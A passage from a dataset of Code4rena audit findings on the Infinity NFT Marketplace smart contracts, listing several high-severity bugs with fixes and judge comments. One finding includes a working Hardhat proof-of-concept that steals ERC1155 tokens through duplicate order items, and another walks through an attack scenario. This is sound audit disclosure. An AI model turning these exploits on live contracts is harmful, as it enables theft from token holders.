ASSETs](https://etherscan.io/token/0xa342f5d851e866e18ff98f351f2c6637f4478db5)'s `supportInterface`, both `supportInterface(0x80ac58cd)` and `supportInterface(0xd9b67a26)` return true.\n\n### Recommended Mitigation Steps\n\nReorder the checks,e.g.,\n\n```solidity\n  function _transferNFTs(\n    address from,\n    address to,\n    OrderTypes.OrderItem calldata item\n  ) internal {\n    if (IERC165(item.collection).supportsInterface(0xd9b67a26)) {\n      _transferERC1155s(from, to, item);\n    } else if (IERC165(item.collection).supportsInterface(0x80ac58cd)) {\n      _transferERC721s(from, to, item);\n    }\n  }\n```\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1162965894):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/377c77f0888fea9ca1e087de701b5384a046f760.\n\n**[HardlyDifficult commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):**\n > When an NFT supports both 721 & 1155 interfaces, the code prefers `_transferERC721s` - however this ignores the order's `numTokens`. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe `_transferERC721s` could require `numTokens == 1`, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange smart contract, which could lead to users paying for more tokens than they receive. The bug affects tokens that support both ERC721 and ERC1155 standards, such as the asset token of The Sandbox Game. The vulnerability is caused by the code in the InfinityExchange contract, which first checks ERC721 interface supports and then ERC1155, leading to only one item being transferred instead of the expected two. The bug can be fixed by reordering the checks, so the ERC1155 check is first. This would ensure that the expected number of tokens is transferred.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43",
      "tags": [
        "supportsInterface",
        "ERC721",
        "ERC1155"
      ],
      "finders": [
        "PwnedNoMore"
      ]
    },
    {
      "id": "2771",
      "title": "[H-05] Missing Complication check in `takeMultipleOneOrders`",
      "impact": "HIGH",
      "content": "_Submitted by shenwilly_\n\nAn order's type and it's rules are defined in it's `Complication`. Not checking it would allow anyone to take any orders regardless of their Complication's rule, causing unexpected execution for order makers.\n\n`takeMultipleOneOrders` assumes that all `makerOrders` are simple orderbook orders and the  Complication check is missing here.\n\n### Proof of Concept\n\n*   Alice signs a makerOrder with `PrivateSaleComplication`, allowing only Bob to take the private sale order.\n*   A malicious trader calls `takeMultipleOneOrders` to take Alice's order, despite the Complication only allowing Bob to take it.\n\n### Recommended Mitigation Steps\n\nAdd `canExecTakeOneOrder` function in IComplication.sol and implement it in `InfinityOrderBookComplication` (and future Complications) to support `takeMultipleOneOrders` operation, then modify `takeMultipleOneOrders` to use the check:\n\n    function takeMultipleOneOrders() {\n        ...\n        for (uint256 i = 0; i < numMakerOrders; ) {\n            bytes32 makerOrderHash = _hash(makerOrders[i]);\n            bool makerOrderValid = isOrderValid(makerOrders[i], makerOrderHash);\n            bool executionValid = IComplication(makerOrders[i].execParams[0]).canExecTakeOneOrder(makerOrders[i]);\n            \n            require(makerOrderValid && executionValid, 'order not verified');\n            \n            require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n            require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n            uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n            totalPrice += execPrice; // @audit-issue missing complication check\n            _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n            unchecked {\n                ++i;\n            }\n        }\n        ...\n    }\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1162936193):**\n > fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/0b7608a2c9efc71d902a9c90f4731ef434b42c31.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/125#issuecomment-1179806203):**\n > `takeMultipleOneOrders` does not check restrictions set via the Complication. Agree with the High risk assessment here.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of a smart contract, namely InfinityExchange.sol, which is part of the code-423n4/2022-06-infinity repository. The vulnerability is related to the way orders are handled by the contract. Specifically, the contract does not check the Complication of an order, which is used to define its type and rules. This means that anyone can take any orders, regardless of the Complication, leading to unexpected execution of orders. \n\nThe Proof of Concept provided in the report shows that Alice signs a makerOrder with a PrivateSaleComplication, which should only allow Bob to take the private sale order. However, a malicious trader can call the takeMultipleOneOrders function to take Alice's order, despite the Complication only allowing Bob to take it.\n\nThe Recommended Mitigation Steps suggest that a canExecTakeOneOrder function should be added in IComplication.sol and implemented into InfinityOrderBookComplication and any future Complications. Additionally, the takeMultipleOneOrders function should be modified to use the check. \n\nIn summary, this bug report is about a vulnerability in the code of a smart contract, which allows anyone to take any orders regardless of their Complication rules, leading to unexpected execution of orders. The Recommended Mitigation Steps suggest the addition of a canExecTakeOneOrder function and modification of the takeMultipleOneOrders function to use this check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/125",
      "tags": [],
      "finders": [
        "shenwilly"
      ]
    },
    {
      "id": "2770",
      "title": "[H-04] Accumulated ETH fees of InfinityExchange cannot be retrieved",
      "impact": "HIGH",
      "content": "_Submitted by hyh, also found by 0x29A, 0xf15ers, 0xkowloon, 0xNineDec, berndartmueller, byterocket, cccz, codexploder, GreyArt, horsefacts, IllIllI, Kenshin, kenzo, KIntern, Lambda, obront, obtarian, oyc_109, peritoflores, rajatbeladiya, rfa, saian, unforgiven, WatchPug, Wayne, and zer0dot_\n\nETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations are permanently frozen within the contract as there is only one way designed to retrieve them, a rescueETH() function, and it will work as intended, not being able to access ETH balance of the contract.\n\nSetting the severity as high as the case is a violation of system's core logic and a permanent freeze of ETH revenue of the project.\n\n### Proof of Concept\n\nFees are accrued in user-facing takeOrders() and takeMultipleOneOrders() via the following call sequences:\n\n    takeOrders -> _takeOrders -> _execTakeOrders -> _transferNFTsAndFees -> _transferFees\n    takeMultipleOneOrders -> _execTakeOneOrder -> _transferNFTsAndFees -> _transferFees\n\nWhile token fees are transferred right away, ETH fees are kept with the InfinityExchange contract:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1119-L1141>\n\n```solidity\n  /**\n   * @notice Transfer fees. Fees are always transferred from buyer to the seller and the exchange although seller is \n            the one that actually 'pays' the fees\n   * @dev if the currency ETH, no additional transfer is needed to pay exchange fees since the contract is 'payable'\n   * @param seller the seller\n   * @param buyer the buyer\n   * @param amount amount to transfer\n   * @param currency currency of the transfer\n   */\n  function _transferFees(\n    address seller,\n    address buyer,\n    uint256 amount,\n    address currency\n  ) internal {\n    // protocol fee\n    uint256 protocolFee = (PROTOCOL_FEE_BPS * amount) / 10000;\n    uint256 remainingAmount = amount - protocolFee;\n    // ETH\n    if (currency == address(0)) {\n      // transfer amount to seller\n      (bool sent, ) = seller.call{value: remainingAmount}('');\n      require(sent, 'failed to send ether to seller');\n```\n\ni.e. when `currency` is ETH the fee part of the amount, `protocolFee`, is left with the InfinityExchange contract.\n\nThe only way to retrieve ETH from the contract is rescueETH() function:\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232>\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n    (bool sent, ) = destination.call{value: msg.value}('');\n    require(sent, 'failed');\n  }\n```\n\nHowever, it cannot reach ETH on the contract balance as `msg.value` is used as the amount to be sent over. I.e. only ETH attached to the rescueETH() call is transferred from `owner` to `destination`. ETH funds that InfinityExchange contract holds remain inaccessible.\n\n### Recommended Mitigation Steps\n\nConsider adding contract balance to the funds transferred:\n\n```solidity\n  /// @dev used for rescuing exchange fees paid to the contract in ETH\n  function rescueETH(address destination) external payable onlyOwner {\n-   (bool sent, ) = destination.call{value: msg.value}('');\n+   (bool sent, ) = destination.call{value: address(this).balance}('');\n    require(sent, 'failed');\n  }\n```\n\n**[nneverlander (Infinity) confirmed](https://github.com/code-423n4/2022-06-infinity-findings/issues/296)** \n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/296#issuecomment-1179570179):**\n > When an order is filled using ETH, the exchange collects fees by holding them in the contract for later withdraw. However the only withdraw mechanism does not work so that ETH becomes trapped forever.\n> \n> This is a High risk issue since some ETH is lost with each ETH based trade.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the ETH fees accumulated from takeOrders() and takeMultipleOneOrders() operations in the InfinityExchange contract. This vulnerability results in the permanent freezing of ETH revenue of the project, and the severity is set as high.\n\nThe ETH fees are kept with the InfinityExchange contract when the currency is ETH, and the only way to retrieve ETH from the contract is the rescueETH() function. However, the rescueETH() function cannot reach the ETH on the contract balance, as only ETH attached to the rescueETH() call is transferred. \n\nThe recommended mitigation steps include adding contract balance to the funds transferred. This will allow the rescueETH() function to access the ETH balance of the contract and prevent the permanent freezing of ETH revenue of the project.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/296",
      "tags": [],
      "finders": [
        "codexploder",
        "0xf15ers",
        "berndartmueller",
        "KIntern",
        "saian",
        "0x29A",
        "zer0dot_",
        "Wayne",
        "obtarian",
        "Lambda",
        "peritoflores",
        "oyc109",
        "Kenshin",
        "kenzo",
        "IllIllI",
        "GreyArt",
        "cccz",
        "WatchPug",
        "horsefacts",
        "0xNineDec",
        "rfa",
        "0xkowloon",
        "byterocket",
        "hyh",
        "unforgiven",
        "rajatbeladiya",
        "obront"
      ]
    },
    {
      "id": "2769",
      "title": "[H-03] `canExecTakeOrder` mismatches `makerOrder` and `takerItems` when duplicated items present",
      "impact": "HIGH",
      "content": "_Submitted by PwnedNoMore, also found by 0xsanson, hyh, k, throttle, and zzzitron_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L154-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L68-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L336-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L178-L243>\n\n### Impact\n\nWhen any user provides a `sellOrder` and they are trying to sell multiple tokens from *n* (n > 1) different `ERC1155` collections in a single order, hakcers can get the tokens of most expensive collections (with n times of the original amount) by paying the same price.\n\nIn short, hackers can violate the user-defined orders.\n\n### Root Cause\n\nThe logic of `canExecTakeOrder` and `canExecMatchOneToMany` is not correct.\n\n**Let's take ` canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)  ` as an example, while `canExecMatchOneToMany` shares the same error.**\n\nSpecifically, it first checks whether the number of selling item in `makerOrder` matches with the ones in `takerItems`. Note that the number is an aggregated one. Then, it check whether all the items in `takerItems` are within the scope defined by `makerOrder`.\n\nThe problem comes when there are duplicated items in `takerItems`. The aggregated number would be correct and all taker's Items are indeed in the order. However, it does not means `takerItems` exactly matches all items in `makerOrder`, which means violation of the order.\n\nFor example, if the order requires\n\n```\n[\n    {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    },\n    {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n    }\n];\n\n```\n\nand the taker provides\n\n    [\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n              collection: mock1155Contract1.address,\n              tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n    ];\n\nThe taker can grabs two `mock1155Contract1` tokens by paying the order which tries to sell a `mock1155Contract1` token and a `mock1155Contract2` token. When `mock1155Contract1` is much more expensive, the victim user will suffer from a huge loss.\n\nAs for the approving issue, the users may grant the contract unlimited access, or they may have another order which sells `mock1155Contract1` tokens. The attack is easy to perform.\n\n### Proof of Concept\n\nFirst put the `MockERC1155.sol` under the `contracts/` directory:\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.14;\nimport {ERC1155URIStorage} from '@openzeppelin/contracts/token/ERC1155/extensions/ERC1155URIStorage.sol';\nimport {ERC1155} from '@openzeppelin/contracts/token/ERC1155/ERC1155.sol';\nimport {Ownable} from '@openzeppelin/contracts/access/Ownable.sol';\n\ncontract MockERC1155 is ERC1155URIStorage, Ownable {\n  uint256 numMints;\n\n  constructor(string memory uri) ERC1155(uri) {}\n\n  function mint(address to, uint256 id, uint256 amount, bytes memory data) external onlyOwner {\n    super._mint(to, id, amount, data);\n  }\n}\n```\n\nAnd then put `poc.js` under the `test/` directory.\n\n```js\nconst { expect } = require('chai');\nconst { ethers, network } = require('hardhat');\nconst { deployContract, NULL_ADDRESS, nowSeconds } = require('../tasks/utils');\nconst {\n  getCurrentSignedOrderPrice,\n  approveERC20,\n  grantApprovals,\n  signOBOrder\n} = require('../helpers/orders');\n\nasync function prepare1155OBOrder(user, chainId, signer, order, infinityExchange) {\n  // grant approvals\n  const approvals = await grantApprovals(user, order, signer, infinityExchange.address);\n  if (!approvals) {\n    return undefined;\n  }\n\n  // sign order\n  const signedOBOrder = await signOBOrder(chainId, infinityExchange.address, order, signer);\n\n  const isSigValid = await infinityExchange.verifyOrderSig(signedOBOrder);\n  if (!isSigValid) {\n    console.error('Signature is invalid');\n    return undefined;\n  }\n  return signedOBOrder;\n}\n\ndescribe('PoC', function () {\n  let signers,\n    dev,\n    matchExecutor,\n    victim,\n    hacker,\n    token,\n    infinityExchange,\n    mock1155Contract1,\n    mock1155Contract2,\n    obComplication\n\n  const sellOrders = [];\n\n  let orderNonce = 0;\n\n  const UNIT = toBN(1e18);\n  const INITIAL_SUPPLY = toBN(1_000_000).mul(UNIT);\n\n  const totalNFTSupply = 100;\n  const numNFTsToTransfer = 50;\n  const numNFTsLeft = totalNFTSupply - numNFTsToTransfer;\n\n  function toBN(val) {\n    return ethers.BigNumber.from(val.toString());\n  }\n\n  before(async () => {\n    // signers\n    signers = await ethers.getSigners();\n    dev = signers[0];\n    matchExecutor = signers[1];\n    victim = signers[2];\n    hacker = signers[3];\n    // token\n    token = await deployContract('MockERC20', await ethers.getContractFactory('MockERC20'), signers[0]);\n\n    // NFT constracts (ERC1155)\n    mock1155Contract1 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri1'\n    ]);\n    mock1155Contract2 = await deployContract('MockERC1155', await ethers.getContractFactory('MockERC1155'), dev, [\n      'uri2'\n    ]);\n\n    // Exchange\n    infinityExchange = await deployContract(\n      'InfinityExchange',\n      await ethers.getContractFactory('InfinityExchange'),\n      dev,\n      [token.address, matchExecutor.address]\n    );\n\n    // OB complication\n    obComplication = await deployContract(\n      'InfinityOrderBookComplication',\n      await ethers.getContractFactory('InfinityOrderBookComplication'),\n      dev\n    );\n\n    // add currencies to registry\n    await infinityExchange.addCurrency(token.address);\n    await infinityExchange.addCurrency(NULL_ADDRESS);\n\n    // add complications to registry\n    await infinityExchange.addComplication(obComplication.address);\n\n    // send assets\n    await token.transfer(victim.address, INITIAL_SUPPLY.div(4).toString());\n    await token.transfer(hacker.address, INITIAL_SUPPLY.div(4).toString());\n    for (let i = 0; i < numNFTsToTransfer; i++) {\n      await mock1155Contract1.mint(victim.address, i, 50, '0x');\n      await mock1155Contract2.mint(victim.address, i, 50, '0x');\n    }\n  });\n\n  describe('StealERC1155ByDuplicateItems', () => {\n    it('Passed test denotes successful hack', async function () {\n      // prepare order\n      const user = {\n        address: victim.address\n      };\n      const chainId = network.config.chainId ?? 31337;\n      const nfts = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract2.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n      const execParams = { complicationAddress: obComplication.address, currencyAddress: token.address };\n      const extraParams = {};\n      const nonce = ++orderNonce;\n      const orderId = ethers.utils.solidityKeccak256(['address', 'uint256', 'uint256'], [user.address, nonce, chainId]);\n      let numItems = 0;\n      for (const nft of nfts) {\n        numItems += nft.tokens.length;\n      }\n      const order = {\n        id: orderId,\n        chainId,\n        isSellOrder: true,\n        signerAddress: user.address,\n        numItems,\n        startPrice: ethers.utils.parseEther('1'),\n        endPrice: ethers.utils.parseEther('1'),\n        startTime: nowSeconds(),\n        endTime: nowSeconds().add(10 * 60),\n        nonce,\n        nfts,\n        execParams,\n        extraParams\n      };\n      const sellOrder = await prepare1155OBOrder(user, chainId, victim, order, infinityExchange);\n      expect(sellOrder).to.not.be.undefined;\n\n      // form matching nfts\n      const nfts_ = [\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        },\n        {\n          collection: mock1155Contract1.address,\n          tokens: [{ tokenId: 0, numTokens: 1 }]\n        }\n      ];\n\n      // approve currency\n      let salePrice = getCurrentSignedOrderPrice(sellOrder);\n      await approveERC20(hacker.address, token.address, salePrice, hacker, infinityExchange.address);\n\n      // perform exchange\n      await infinityExchange.connect(hacker).takeOrders([sellOrder], [nfts_]);\n\n      // owners after sale\n      // XXX: note that the user's intention is to send mock1155Contract1 x 1 + mock1155Contract2 x 1\n      // When mock1155Contract1 is much more expensive than mock1155Contract2, user suffers from huge loss\n      expect(await mock1155Contract1.balanceOf(hacker.address, 0)).to.equal(2);\n    });\n  });\n});\n```\n\nAnd run\n\n```bash\n$ npx hardhat test --grep PoC\n\n  PoC\n    StealERC1155ByDuplicateItems\n      ✓ Passed test denotes successful hack\n```\n\nNote that the passed test denotes a successful hack.\n\n### Recommended Mitigation Steps\n\nI would suggest a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.\n\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1162897771):**\n > Fixed in https://github.com/infinitydotxyz/exchange-contracts-v2/commit/bbbd362f18a2bb1992620a76e59621132b8a3d8c.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/12#issuecomment-1179560900):**\n> This is a High risk issue. The PoC demonstrates how a maker specifying a bundle of NFTs could incorrectly have one ERC1155 item in that bundle processed several times by the taker - the bundle is not fully accepted as expected, the item processed multiple times is essentially overfilled, and this may be abused to the taker's advantage when the NFTs are not valued the same.\n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the InfinityExchange and InfinityOrderBookComplication contracts. The bug allows hackers to violate user-defined orders by providing a 'sellOrder' with multiple tokens from different ERC1155 collections in a single order. The flaw is in the logic of 'canExecTakeOrder' and 'canExecMatchOneToMany' which do not take into account duplicated items in the 'takerItems'. This could allow a hacker to pay for a single order, but receive multiple tokens from the most expensive collection. This can lead to a user suffering a huge loss. \n\nThe proof of concept code was tested with Hardhat and confirmed the vulnerability. Manual inspection was used as the tool. \n\nThe recommended mitigation step is to use a more gas-consuming approach by hashing all the items and putting them into a list. Then checking whether the lists match.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/12",
      "tags": [],
      "finders": [
        "0xsanson",
        "k",
        "throttle",
        "zzzitron",
        "hyh",
        "PwnedNoMore"
      ]
    },
    {
      "id": "2768",
      "title": "[H-02] Loss of funds in `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in `doTokenIdsIntersect()` especially for ERC1155 tokens)",
      "impact": "HIGH",
      "content": "_Submitted by unforgiven_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243>\n\n### Impact\n\nFunction `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)\n\n### Proof of Concept\n\nThis is `_takeOrders()` and `and` code:\n\n      /**\n       * @notice Internal helper function to take orders\n       * @dev verifies whether order can be executed\n       * @param makerOrder the maker order\n       * @param takerItems nfts to be transferred\n       * @param execPrice execution price\n       */\n      function _takeOrders(\n        OrderTypes.MakerOrder calldata makerOrder,\n        OrderTypes.OrderItem[] calldata takerItems,\n        uint256 execPrice\n      ) internal {\n        bytes32 makerOrderHash = _hash(makerOrder);\n        bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);\n        bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);\n        require(makerOrderValid && executionValid, 'order not verified');\n        _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);\n      }\n\nAs you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity:\n\n      /**\n       * @notice Checks whether take orders with a higher order intent can be executed\n       * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.\n              It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid\n              and whether the nfts intersect\n       * @param makerOrder the maker order\n       * @param takerItems the taker items specified by the taker\n       * @return returns whether order can be executed\n       */\n      function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        external\n        view\n        override\n        returns (bool)\n      {\n        return (makerOrder.constraints[3] <= block.timestamp &&\n          makerOrder.constraints[4] >= block.timestamp &&\n          areTakerNumItemsValid(makerOrder, takerItems) &&\n          doItemsIntersect(makerOrder.nfts, takerItems));\n      }\n\n      /// @dev sanity check to make sure that a taker is specifying the right number of items\n      function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 numTakerItems = 0;\n        uint256 nftsLength = takerItems.length;\n        for (uint256 i = 0; i < nftsLength; ) {\n          unchecked {\n            numTakerItems += takerItems[i].tokens.length;\n            ++i;\n          }\n        }\n        return makerOrder.constraints[0] == numTakerItems;\n      }\n\n      /**\n       * @notice Checks whether tokenIds intersect\n       * @dev This function checks whether there are intersecting tokenIds between two order items\n       * @param item1 first item\n       * @param item2 second item\n       * @return returns whether tokenIds intersect\n       */\n      function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)\n        public\n        pure\n        returns (bool)\n      {\n        uint256 item1TokensLength = item1.tokens.length;\n        uint256 item2TokensLength = item2.tokens.length;\n        // case where maker/taker didn't specify any tokenIds for this collection\n        if (item1TokensLength == 0 || item2TokensLength == 0) {\n          return true;\n        }\n        uint256 numTokenIdsPerCollMatched = 0;\n        for (uint256 k = 0; k < item2TokensLength; ) {\n          for (uint256 l = 0; l < item1TokensLength; ) {\n            if (\n              item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens\n            ) {\n              // increment numTokenIdsPerCollMatched\n              unchecked {\n                ++numTokenIdsPerCollMatched;\n              }\n              // short circuit\n              break;\n            }\n            unchecked {\n              ++l;\n            }\n          }\n          unchecked {\n            ++k;\n          }\n        }\n\n        return numTokenIdsPerCollMatched == item2TokensLength;\n      }\n\nAs you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:\n\n1.  For simplicity, let's assume collection and timestamp are valid and match for orders and token is `ERC1155`\n2.  `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`)\n3.  `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH`\n4.  `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times)\n5.  Attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B\n6.  Contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction.\n7.  `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.\n\nThis examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).\n\nThis scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nAdd checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`\n\n**[nneverlander (Infinity) confirmed and resolved](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1162878540):**\n > Agree with assessment. Fixed. https://github.com/infinitydotxyz/exchange-contracts-v2/commit/c3c0684ac02e0cf1c03cdbee7e68c5a37fa334a8 and removed support for ERC1155\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/135#issuecomment-1179823515):**\n > This is an interesting scenario where the same NFT appears multiple times in a match and results in one order being under filled, leading to potential losses for the user. And the attack does not depend on the matching engine. Agree this is High risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project called Infinity. This project is a decentralized exchange for trading Non-Fungible Tokens (NFTs). The bug is in the code of the function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` which are used to match \"sell order\" to \"buy order\" and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. The problem is that there is no check in the code to verify that an order has different Non-Fungible Token (NFT) ids in each of its collections. This means that it is possible for a user to transfer the wrong tokens and lose funds.\n\nTo exploit this vulnerability, an attacker could create a list of tokens to trade (B) with the same NFT id but different numbers of tokens. They could then call the `takeOrders()` function with this list and the user's order (A). The code does not check that the NFT ids in the order are different, so the attacker would receive the funds from the user's order for the same NFT id but different numbers of tokens. The user would receive the wrong tokens and lose funds.\n\nThe recommended mitigation step is to add checks to the code to ensure that the order's one collection's token ids are not duplicates in the `doTokenIdsIntersect()` function. This would help to prevent attackers from exploiting the vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135",
      "tags": [
